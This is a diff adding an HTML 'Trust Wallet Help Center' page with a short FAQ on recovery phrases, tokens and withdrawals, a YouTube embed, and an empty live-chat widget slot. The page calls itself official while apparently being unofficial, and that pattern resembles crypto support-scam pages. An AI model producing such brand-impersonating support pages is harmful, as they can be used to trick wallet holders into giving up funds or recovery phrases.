@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Trust Wallet Help Center</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #3375f6;
+      --background: #f9fbfe;
+      --card: #ffffff;
+      --text: #1e1e1e;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--background);
+      color: var(--text);
+      line-height: 1.6;
+    }
+
+    header {
+      background-color: var(--primary);
+      padding: 2rem 1rem;
+      text-align: center;
+      color: white;
+    }
+
+    .logo {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 1.8rem;
+      font-weight: 600;
+    }
+
+    .logo img {
+      width: 40px;
+      height: 40px;
+    }
+
+    main {
+      max-width: 1000px;
+      margin: 3rem auto;
+      padding: 0 1rem;
+    }
+
+    .section {
+      background: var(--card);
+      padding: 2rem;
+      margin-bottom: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.05);
+    }
+
+    .section h2 {
+      color: var(--primary);
+      margin-bottom: 1rem;
+      font-size: 1.4rem;
+    }
+
+    .faq-item {
+      margin-bottom: 1.5rem;
+    }
+
+    .faq-item h3 {
+      font-size: 1.1rem;
+      margin-bottom: 0.4rem;
+      color: #333;
+    }
+
+    .faq-item p {
+      color: #555;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem;
+      font-size: 0.9rem;
+      color: #888;
+    }
+
+    @media (max-width: 600px) {
+      .logo {
+        font-size: 1.4rem;
+      }
+      .logo img {
+        width: 32px;
+        height: 32px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">
+      <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo">
+      Trust Wallet Support
+    </div>
+    <p style="margin-top: 0.5rem; font-size: 1rem;">Official Help Center</p>
+  </header>
+
+  <main>
+    <div class="section">
+      <h2>Frequently Asked Questions</h2>
+
+      <div class="faq-item">
+        <h3>🔐 How do I access my wallet?</h3>
+        <p>Open the Trust Wallet app and use your 12-word recovery phrase to restore your wallet securely.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>📦 Tokens missing?</h3>
+        <p>Ensure the token is supported, and manually add its contract address if needed.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>💸 I'm having trouble with withdrawal</h3>
+        <p>If your withdrawal isn't processing, confirm the receiving address, check network congestion, and ensure you have enough BNB or ETH to cover gas fees. If the issue persists, contact support below.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>📲 Where can I get help?</h3>
+        <p>Use the live chat feature (below) to speak to our support team directly.</p>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>🎥 Watch: What is Trust Wallet?</h2>
+      <p>New to Trust Wallet? Watch this quick introduction to learn more:</p>
+
+      <div style="position:relative; padding-bottom:56.25%; height:0; overflow:hidden; border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1); margin-top:1rem;">
+        <iframe src="https://www.youtube.com/embed/_j-kSZkJQmc" 
+                title="What is Trust Wallet?" 
+                style="position:absolute; top:0; left:0; width:100%; height:100%; border:0;" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                allowfullscreen></iframe>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>Live Support</h2>
+      <p>Need assistance? Our team is ready to help. Live chat should appear below if enabled:</p>
+
+      <!-- 🟢 LIVE CHAT PLACEHOLDER: Paste your widget script below -->
+      <!-- Example: <script src="https://your-livechat.com/widget.js"></script> -->
+
+    </div>
+  </main>
+
+  <footer>
+    &copy; 2025 Trust Wallet Help Center |Trust Wallet Inc.
+  </footer>
+
+</body>
+</html>
